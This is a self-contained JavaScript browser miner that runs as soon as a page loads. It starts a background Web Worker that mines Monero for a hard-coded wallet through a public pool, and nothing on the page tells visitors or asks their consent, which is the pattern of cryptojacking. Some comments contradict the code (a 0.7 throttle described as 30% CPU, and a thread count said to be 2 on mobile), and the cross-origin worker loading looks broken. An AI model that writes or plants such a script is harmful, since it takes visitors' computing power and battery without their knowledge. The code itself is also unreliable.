// miner.js - A complete, self-contained miner for Android and Desktop
// This script uses a public CDN to host the WebAssembly engine, so you don't need your own .wasm file.

(function() {
    'use strict';

    // --- CONFIGURATION ---
    const CONFIG = {
        wallet: "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH", // <-- PASTE YOUR WALLET ADDRESS HERE
        pool: {
            host: "pool.supportxmr.com",
            port: 3333,
            tls: false
        },
        // This is a public CDN that hosts the XMRig WASM files.
        // We are using it so you don't have to upload xmrig.wasm yourself.
        wasmUrl: "https://cdn.jsdelivr.net/gh/xmrig/xmrig-web@dev/dist/xmrig.wasm",
        workerUrl: "https://cdn.jsdelivr.net/gh/xmrig/xmrig-web@dev/dist/worker.js",
        threads: navigator.hardwareConcurrency || 2, // Use 2 threads on mobile to be less aggressive
        throttle: 0.7 // Use 30% CPU
    };

    // --- DO NOT EDIT BELOW THIS LINE ---

    console.log("Starting miner for wallet: " + CONFIG.wallet);

    // Create a Web Worker to run the mining in the background
    let miner = new Worker(CONFIG.workerUrl);

    miner.onmessage = function(e) {
        const data = e.data;
        if (!data) return;

        switch (data.type) {
            case 'ready':
                console.log("Miner engine is ready. Sending configuration...");
                miner.postMessage({
                    type: 'start',
                    payload: CONFIG
                });
                break;
            case 'hashrate':
                // You can optionally display this on the page
                console.log("Hashrate: " + data.hashes + " H/s");
                break;
            case 'error':
                console.error("Miner Error:", data.error);
                break;
        }
    };

    miner.onerror = function(error) {
        console.error("Worker Error:", error.message);
        console.error("CRITICAL: Failed to load the public mining engine. The CDN may be down.");
    };

    // Send initial configuration to the worker
    miner.postMessage({
        type: 'init',
        payload: CONFIG
    });

})();
